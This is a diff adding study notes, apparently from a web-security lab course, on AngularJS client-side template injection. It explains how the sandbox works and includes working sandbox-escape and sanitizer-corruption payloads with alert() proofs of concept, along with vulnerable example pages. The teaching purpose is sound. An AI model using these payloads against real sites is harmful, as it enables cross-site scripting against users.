@@ -418,6 +418,7 @@ LAB:  Reflected XSS into a template literal with angle brackets, single, double 
 Payload: ${alert(1)}
 
 
+
                                                     ## Client-side template injection
                                                     
 # We'll describe how you can craft exploits that escape from the AngularJS sandbox, and how you can potentially use AngularJS features to bypass content security policy (CSP).
@@ -427,6 +428,123 @@ Payload: ${alert(1)}
 
 
 
+
+                                                                ## What is client-side template injection?
+                                                                
+# Client-side template injection vulnerabilities arise when applications using a client-side template framework dynamically embed user input in web page
+# When rendering a page, the framework scans it for template expressions and executes any that it encounters.
+# An attacker can exploit this by supplying a malicious template expression that launches a cross-site scripting (XSS) attack. 
+
+                                          
+                                                                 ## What is the AngularJS sandbox?
+                                                                 
+# The AngularJS sandbox is a mechanism that prevents access to potentially dangerous objects, such as window or document, in AngularJS template expressions.
+# It also prevents access to potentially dangerous properties, such as __proto__
+# Although bypassing the sandbox was initially challenging, security researchers have discovered numerous ways of doing so.
+# As a result, it was eventually removed from AngularJS in version 1.6.
+# However, many legacy applications still use older versions of AngularJS and may be vulnerable as a result. 
+
+                                            
+                                                      ## How does the AngularJS sandbox work?
+                                                      
+ # The sandbox works by parsing an expression, rewriting the JavaScript, and then using various functions to test whether the rewritten code contains any dangerous objects.
+ # For example, the ensureSafeObject() function checks whether a given object references itself.
+ # The ensureSafeMemberName() function checks each property access of the object and, if it contains dangerous properties such as __proto__ or __lookupGetter__, the object will be blocked.
+ # The ensureSafeFunction()function prevents call(), apply(), bind(), or constructor() from being called. 
+ 
+                                                      
+
+                                                    ## How does an AngularJS sandbox escape work?
+                                                    
+# A sandbox escape involves tricking the sandbox into thinking the malicious expression is benign.
+# The most well-known escape uses the modified charAt() function globally within an expression: 
+
+Payload: 'a'.constructor.prototype.charAt=[].join
+
+# When it was initially discovered, AngularJS did not prevent this modification.
+# The attack works by overwriting the function using the [].join method, which causes the charAt() function to return all the characters sent to it, rather than a specific single character.
+# Due to the logic of the isIdent() function in AngularJS, it compares what it thinks is a single character against multiple characters.
+# As single characters are always less than multiple characters, the isIdent() function always returns true, as demonstrated by the following example: 
+
+
+                                isIdent = function(ch) {
+                                    return ('a' <= ch && ch <= 'z' || 'A' <= ch && ch <= 'Z' || '_' === ch || ch === '$');
+                                }
+                                isIdent('x9=9a9l9e9r9t9(919)')
+
+# Once the isIdent() function is fooled, you can inject malicious JavaScript.
+# For example, an expression such as $eval('x=alert(1)') would be allowed because AngularJS treats every character as an identifier. 
+# Note that we need to use AngularJS's $eval() function because overwriting the charAt() function will only take effect once the sandboxed code is executed.
+# This technique would then bypass the sandbox and allow arbitrary JavaScript execution.
+
+# Angular expressions can't do much harm on their own, but when combined with a sandbox escape we can execute arbitrary JavaScript and do some serious damage.
+
+# The first page dynamically embeds user input, but is not vulnerable to XSS because it uses htmlspecialchars to HTML encode the input:
+
+                            <html>
+                            <body>
+                            <p>
+                            <?php
+                            $q = $_GET['q'];
+                            echo htmlspecialchars($q,ENT_QUOTES);
+                            ?>
+                            </p>
+                            </body>
+                            </html>
+                            
+# The second page is almost identical, but the Angular import means it can be exploited by injecting an Angular expression, and with a sandbox escape we can get XSS.
+
+                          <html ng-app>
+                          <head>
+                          <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.7/angular.js"></script>
+                          </head>
+                          <body>
+                          <p>
+                          <?php
+                          $q = $_GET['q'];
+                          echo htmlspecialchars($q,ENT_QUOTES);?>
+                          </p>   
+                          </body>
+                          </html>
+                          
+# Note that you need to have "ng-app" above the expression in the DOM tree. Usually an Angular site will use it in the root HTML or body tag.                          
+                          
+                          
+                          
+                                                    ## Corrupting the sanitizer
+# The Angular sanitizer is a client side filter written in JavaScript that extends Angular to safely allow HTML bindings using attributes called ng-bind-html that contain a reference you want to filter.
+# It then takes the input and renders it in an invisible DOM tree and applies white list filtering to the elements and attributes.
+
+Payload: {{ 'a'.constructor.fromCharCode=[].join; 
+            'a'.constructor[0]='\u003ciframe onload=alert(/Backdoored/)\u003e';
+          }}
+
+
+Payload:
+
+            {{
+                'a'.constructor.prototype.charCodeAt=[].concat
+            }}
+            </div>
+            <script>
+            onload=function(){
+              alert('abc'.charCodeAt(0));
+            }
+            </script>
+                  
+
+                                    ## Escaping the sandbox
+Payload: 
+
+{{
+    'a'.constructor.prototype.charAt=[].join;
+    $eval('x=""')+''
+}}    
+
+                          
+                          
+                          
+                          
 
 
 
